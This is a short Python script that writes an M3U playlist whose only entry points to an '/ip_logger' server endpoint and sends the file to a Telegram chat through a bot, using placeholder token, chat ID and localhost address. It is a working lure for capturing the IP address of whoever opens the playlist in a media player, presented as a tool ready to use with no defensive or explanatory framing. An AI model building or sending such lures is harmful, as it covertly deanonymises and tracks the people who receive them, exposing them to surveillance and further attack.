import requests
import os
BOT_TOKEN = "ur token"
CHAT_ID ="chat_id"

SERVER_URL = "http://127.0.0.1:5000/ip_logger"

m3u_content = f"""#EXTM3U
#EXTINF:-1, Open Logger
{SERVER_URL}
"""
# 
m3u_path = "log_ip.m3u"
with open(m3u_path, "w", encoding="utf-8") as file:
    file.write(m3u_content)
files = {
    "document": ("log_ip.m3u", open(m3u_path, "rb"), "application/x-mpegurl")
}

url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument"

data = {"chat_id": CHAT_ID}
response = requests.post(url, data=data, files=files)

if response.status_code == 200:
    print("M3U file sent successfully to Telegram.")
else:
    print(f"Error sending file: {response.text}")
